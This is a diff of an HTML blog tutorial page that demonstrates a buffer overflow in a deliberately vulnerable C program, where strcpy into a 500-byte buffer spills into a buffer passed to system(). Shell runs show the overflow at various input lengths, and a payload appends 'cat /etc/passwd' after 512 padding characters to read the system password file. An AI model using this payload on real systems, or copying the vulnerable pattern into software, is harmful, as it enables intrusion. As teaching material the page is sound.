@@ -65,8 +65,6 @@
         
           
         
-          
-        
           <a class="page-link" href="/notes/">Notes</a>
         
       </div>
@@ -103,21 +101,21 @@ further study because as the program size increases, just the complexity to
 find the limit for buffer overflowing increases, mostly all other factors
 remains same.</p>
 
-<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
-<span class="cp">#include &lt;stdlib.h&gt;</span>
-
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
     <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">500</span><span class="p">];</span>
 
     <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">%s   [[[[[%s]]]]]]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s   [[[[[%s]]]]]]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
     <span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
+<span class="p">}</span></code></pre></figure>
 
 <p>What this program does:</p>
 
@@ -146,7 +144,7 @@ hand the default lenght for stcpy would the maximum string length.
 <p>Below given is the input and output for various lengths of inputs(different
 lengths for the string AAAA…AAA):</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">BufferOverFlow<span class="o">||</span>22:41<span class="nv">$ </span>./simple <span class="sb">`</span>python2.7 -c <span class="s1">&#39;print &quot;A&quot; * 510&#39;</span><span class="sb">`</span>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">BufferOverFlow||22:41$ </span>./simple <span class="sb">`</span>python2.7 -c <span class="s1">'print "A" * 510'</span><span class="sb">`</span>
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -154,11 +152,11 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
-<span class="o">[[[[[</span>p�k�<span class="o">]]]]]]</span>
-sh: <span class="s1">$&#39;p\205k\206\377\177&#39;</span>: <span class="nb">command </span>not found
+<span class="o">[[[[[</span>p�k�]]]]]]
+sh: <span class="nv">$'</span>p<span class="se">\2</span>05k<span class="se">\2</span>06<span class="se">\3</span>77<span class="se">\1</span>77<span class="s1">': command not found
 
 
-BufferOverFlow<span class="o">||</span>22:42<span class="nv">$ </span>./simple <span class="sb">`</span>python2.7 -c <span class="s1">&#39;print &quot;A&quot; * 511&#39;</span><span class="sb">`</span>
+BufferOverFlow||22:42$ ./simple `python2.7 -c '</span>print <span class="s2">"A"</span> <span class="k">*</span> 511<span class="s1">'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -166,10 +164,10 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
-<span class="o">[[[[[</span>@�y<span class="nv">$]</span><span class="o">]]]]]</span>
-sh: @�y<span class="nv">$:</span> <span class="nb">command </span>not found
+[[[[[@�y$]]]]]]
+sh: @�y$: command not found
 
-BufferOverFlow<span class="o">||</span>22:41<span class="nv">$ </span>./simple <span class="sb">`</span>python2.7 -c <span class="s1">&#39;print &quot;A&quot; * 512&#39;</span><span class="sb">`</span>
+BufferOverFlow||22:41$ ./simple `python2.7 -c '</span>print <span class="s2">"A"</span> <span class="k">*</span> 512<span class="s1">'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -177,9 +175,9 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
-<span class="o">[[[[[]]]]]]</span>
+[[[[[]]]]]]
 
-BufferOverFlow<span class="o">||</span>22:42<span class="nv">$ </span>./simple <span class="sb">`</span>python2.7 -c <span class="s1">&#39;print &quot;A&quot; * 513&#39;</span><span class="sb">`</span>
+BufferOverFlow||22:42$ ./simple `python2.7 -c '</span>print <span class="s2">"A"</span> <span class="k">*</span> 513<span class="s1">'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -187,10 +185,10 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
-<span class="o">[[[[[</span>A<span class="o">]]]]]]</span>
-sh: A: <span class="nb">command </span>not found
+[[[[[A]]]]]]
+sh: A: command not found
 
-BufferOverFlow<span class="o">||</span>22:41<span class="nv">$ </span>./simple <span class="sb">`</span>python2.7 -c <span class="s1">&#39;print &quot;A&quot; * 515&#39;</span><span class="sb">`</span>
+BufferOverFlow||22:41$ ./simple `python2.7 -c '</span>print <span class="s2">"A"</span> <span class="k">*</span> 515<span class="s1">'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -198,8 +196,8 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
-<span class="o">[[[[[</span>AAA<span class="o">]]]]]]</span>
-sh: AAA: <span class="nb">command </span>not found</code></pre></div>
+[[[[[AAA]]]]]]
+sh: AAA: command not found</span></code></pre></figure>
 
 <p>This shows us that (for the above given program) when the input size becomes
 larger than or equal to 513(remember that the buffer length was 500charactors),
@@ -207,9 +205,9 @@ the second variable, cmd starts to get overwritten by the excess or in our case
 the overflowed charactors from the input.
 Therefore a conclusion can be made that if the input string can be formatted in
 such a way that a valid bash command can be appended to the last of 512 random
-charactors, that will get executed .i.e., <code>python2.7 -c 'print "A" * 512 + "&lt;required command&gt;"'</code></p>
+charactors, that will get executed .i.e., <code class="highlighter-rouge">python2.7 -c 'print "A" * 512 + "&lt;required command&gt;"'</code></p>
 
-<p>If the input was <code>python2.7 -c 'print "A" * 512 + "cat /etc/passwd"'</code>, the
+<p>If the input was <code class="highlighter-rouge">python2.7 -c 'print "A" * 512 + "cat /etc/passwd"'</code>, the
 attacker would be able to read the passwd file from the vulnarable machine.</p>
 
 <p>NOTE:</p>
